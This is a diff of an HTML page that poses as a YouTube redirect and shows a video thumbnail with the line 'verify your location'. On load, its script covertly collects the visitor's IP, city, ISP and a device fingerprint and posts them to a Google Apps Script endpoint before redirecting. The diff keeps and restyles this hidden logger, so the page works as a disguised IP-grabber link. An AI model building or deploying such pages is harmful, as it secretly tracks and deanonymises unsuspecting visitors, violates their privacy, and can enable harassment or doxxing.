@@ -2,61 +2,78 @@
 <html>
 <head>
   <title>Redirecting...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    img {
+      width: 320px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #00000033;
+    }
+  </style>
 </head>
 <body>
-  <h2>Redirecting... Please wait</h2>
+
+  <h2>Redirecting to YouTube...</h2>
+  <p>Please wait while we verify your location and redirect you.</p>
+  <img id="thumbnail" src="" alt="YouTube Thumbnail" />
 
   <script>
-    async function collectAndSend() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const ipData = await res.json();
+    const videoURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ← Change this
+    const videoID = videoURL.split("v=")[1].split("&")[0];
+    const thumbnailURL = `https://img.youtube.com/vi/${videoID}/hqdefault.jpg`;
+    document.getElementById("thumbnail").src = thumbnailURL;
 
-        const fields = {
-          IP: ipData.ip || '',
-          City: ipData.city || '',
-          Region: ipData.region || '',
-          Country: ipData.country_name || '',
-          ISP: ipData.org || '',
-          Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          TimeOffset: new Date().getTimezoneOffset(),
-          Language: navigator.language,
-          UserAgent: navigator.userAgent,
-          Platform: navigator.platform,
-          Screen: `${screen.width}x${screen.height}`,
-          ColorDepth: screen.colorDepth,
-          DeviceMemory: navigator.deviceMemory || '',
-          CPUCores: navigator.hardwareConcurrency || '',
-          Online: navigator.onLine,
-          DoNotTrack: navigator.doNotTrack,
-          TouchSupport: ('ontouchstart' in window),
-          ConnectionType: navigator.connection?.effectiveType || '',
-          Referrer: document.referrer || 'Direct'
-        };
+    function collectAndSend() {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(ipData => {
+          const fields = {
+            IP: ipData.ip || '',
+            City: ipData.city || '',
+            Region: ipData.region || '',
+            Country: ipData.country_name || '',
+            ISP: ipData.org || '',
+            Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            TimeOffset: new Date().getTimezoneOffset(),
+            Language: navigator.language,
+            UserAgent: navigator.userAgent,
+            Platform: navigator.platform,
+            Screen: `${screen.width}x${screen.height}`,
+            ColorDepth: screen.colorDepth,
+            DeviceMemory: navigator.deviceMemory || '',
+            CPUCores: navigator.hardwareConcurrency || '',
+            Online: navigator.onLine,
+            DoNotTrack: navigator.doNotTrack,
+            TouchSupport: ('ontouchstart' in window),
+            ConnectionType: navigator.connection?.effectiveType || '',
+            Referrer: document.referrer || 'Direct'
+          };
 
-        const formData = new FormData();
-        for (const key in fields) {
-          formData.append(key, fields[key]);
-        }
+          const formData = new FormData();
+          for (const key in fields) {
+            formData.append(key, fields[key]);
+          }
 
-        await fetch('https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec', {
-          method: 'POST',
-          body: formData
-        });
-
-      } catch (e) {
-        console.error('Error:', e);
-      }
+          fetch('https://script.google.com/macros/s/AKfycbzW1Q21J2tzjygpYtj9JgmJXaaDQEj_LDgGeHopJgfGS7YoD05z6wvHgBnLk2jIdtU/exec', {
+            method: 'POST',
+            body: formData
+          });
+        })
+        .catch(err => console.error('Logging error:', err));
     }
 
-    async function start() {
-      await collectAndSend();
-      setTimeout(() => {
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // 🔁 Change target if needed
-      }, 1000);
-    }
+    // Start background logging
+    collectAndSend();
 
-    window.onload = start;
+    // Redirect after short delay
+    setTimeout(() => {
+      window.location.href = videoURL;
+    }, 1000);
   </script>
+
 </body>
 </html>
